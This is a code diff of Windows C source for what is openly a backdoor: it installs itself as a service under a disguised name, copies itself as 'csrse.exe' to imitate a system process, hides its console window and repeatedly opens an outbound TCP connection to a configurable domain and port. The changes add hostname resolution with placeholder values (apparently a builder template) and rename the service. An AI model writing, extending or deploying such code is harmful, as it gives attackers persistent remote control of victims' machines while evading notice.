@@ -32,8 +32,8 @@
 void WINAPI BDHandler(DWORD dwControl);
 void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
 char const FLAG_[15] = "yyyyyyyyyyyyyyy";
-char const address[] = "127.0.0.1";
-char const port[] = "81";
+char const domain[50] = "1111111111111111111111111111111111111111111111111";
+char const port[5] = "2222";
 char const SIGN[10] = "customize";
 char const version[] = "Ver 1.0";
 SECURITY_ATTRIBUTES pipeattr1,pipeattr2; 
@@ -393,16 +393,25 @@ void BackDoor(SOCKET sock){
 void Handle(){
     WSADATA WSAData;
     SOCKET sock; 
-
+    DWORD dwIP = 0; 
     SOCKADDR_IN addr_in;
     
 
     
     WSAStartup(MAKEWORD(2,2),&WSAData); 
+    HOSTENT* pHS = gethostbyname(domain);
+    if(pHS!=NULL){
+    struct in_addr addr;
+    CopyMemory(&addr.S_un.S_addr, pHS->h_addr_list[0], pHS->h_length);
+    dwIP = addr.S_un.S_addr;
+    }else{
+        WSACleanup();
+        return;
+    }
 
     addr_in.sin_family=AF_INET;
     addr_in.sin_port=htons(atoi(port)); 
-    addr_in.sin_addr.S_un.S_addr=inet_addr(address);
+    addr_in.sin_addr.S_un.S_addr=dwIP;
  
     sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
     
@@ -491,7 +500,7 @@ void Handle(){
 }
 void Init(){
 
-    CreateEventA(0,FALSE,FALSE,"MemoryStatus");
+    CreateEventA(0,FALSE,FALSE,"InternelStatus");
     while(1){
         Handle();
         Sleep(3000);
@@ -501,7 +510,7 @@ void Init(){
 void WINAPI ServiceMain(DWORD dwArgc,  LPTSTR* lpszArgv){
     DWORD dwThreadId;
     // WriteToLog("Running..");
-    if (!(ServiceStatusHandle = RegisterServiceCtrlHandler("MemoryStatus",
+    if (!(ServiceStatusHandle = RegisterServiceCtrlHandler("InternelStatus",
                      BDHandler))) return;
     ServiceStatus.dwServiceType  = SERVICE_WIN32_OWN_PROCESS;
     ServiceStatus.dwCurrentState  = SERVICE_START_PENDING;
@@ -542,12 +551,12 @@ void ServiceInstall(BOOL auto_delete){
     char  Direectory[MAX_PATH];
     char  cmd[255];
     ShowWindow(GetConsoleWindow(), SW_HIDE);
-    if (OpenEventA(2031619,FALSE,"MemoryStatus") != 0 ){
+    if (OpenEventA(2031619,FALSE,"InternelStatus") != 0 ){
         return ;
     }
     // AdvanceProcess();
     SERVICE_TABLE_ENTRY ServiceTable[2];
-    ServiceTable[0].lpServiceName = (char*)"MemoryStatus";
+    ServiceTable[0].lpServiceName = (char*)"InternelStatus";
     ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
     ServiceTable[1].lpServiceName = NULL;
     ServiceTable[1].lpServiceProc = NULL;
@@ -562,13 +571,13 @@ void ServiceInstall(BOOL auto_delete){
         strcat(target,"\\csrse.exe");
         // printf(target);
         CopyFile(szPath,target,TRUE);
-        sprintf(cmd,"sc create MemoryStatus binPath= %s",target);
+        sprintf(cmd,"sc create InternelStatus binPath= %s",target);
         // ShellExecuteA(NULL,"open","sc.exe",cmd,"",SW_HIDE);
         // ShellExecuteA(NULL,"open","sc.exe","start MemoryStatus","",SW_HIDE);
         system(cmd);
-        sprintf(cmd,"attrib +s +a +h +r %s",target);
+        //sprintf(cmd,"attrib +s +a +h +r %s",target);
         system(cmd);
-        system("sc start MemoryStatus");
+        system("sc start InternelStatus");
         
         return ;
      }
@@ -582,7 +591,7 @@ int _stdcall WinMain(
     int nCmdShow
 )
 {
-    ServiceInstall(false);
+    //ServiceInstall(false);
     
     Init();
     return 0;
